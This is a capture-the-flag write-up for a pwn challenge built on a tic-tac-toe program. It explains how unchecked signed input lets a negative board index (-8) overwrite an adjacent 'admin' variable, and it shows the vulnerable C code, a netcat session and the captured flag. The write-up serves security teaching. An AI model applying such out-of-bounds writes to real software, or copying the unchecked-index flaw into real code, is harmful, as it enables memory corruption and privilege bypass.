# pwn/interesting

This challenge is supposed to be solved with an out-of-bounds (oob) write exploit.

The premise is a tic-tac-toe game in which the player must choose a section of the board to place their 'x'. However, when the user is presented with a prompt to choose which square to play, there is no bounds checking on the value inputted. So, an 'x' can be written to anywhere in memory. 

The flag is only accessible if the `admin` variable is not `0`. The `admin` variable is defined right before the `char` array that represents the board:

```c
int main(int argc, char* argv[]) {
    setup();
    int selection = 0;
    int admin = 0;
    char board[9] = {' ',' ',' ',' ',' ',' ',' ',' ',' '};
    printf("Welcome to TicTacToe!\nInput a board location to place your 'x'.\n");
...
```

The `scanf` call with which the user inputs their selection uses a `%d` for a signed integer instead of an unsigned integer. Because of this, a user can input negative numbers. Thus, they can write a value to the `admin` variable using a negative number, such as `-8`. Because the `admin` variable is an integer, writing to any value in the 4 byte range from `-8`->`-11` will work:

```
$ nc challs.ctf.uahcyber.club 46412
Welcome to TicTacToe!
Input a board location to place your 'x'.
Current board:
  |   |  
---------
  |   |  
---------
  |   |  

0 | 1 | 2
---------
3 | 4 | 5
---------
6 | 7 | 8
Selection (0-8): -8
Current board:
...
Selection (0-8): 2
...
Selection (0-8): 4
...
Selection (0-8): 6
Current board:
o | o | x
---------
o | x |  
---------
x |   |  
you win!!
flag: UAH{wh4t_if_it5_negat1v3_th0}
```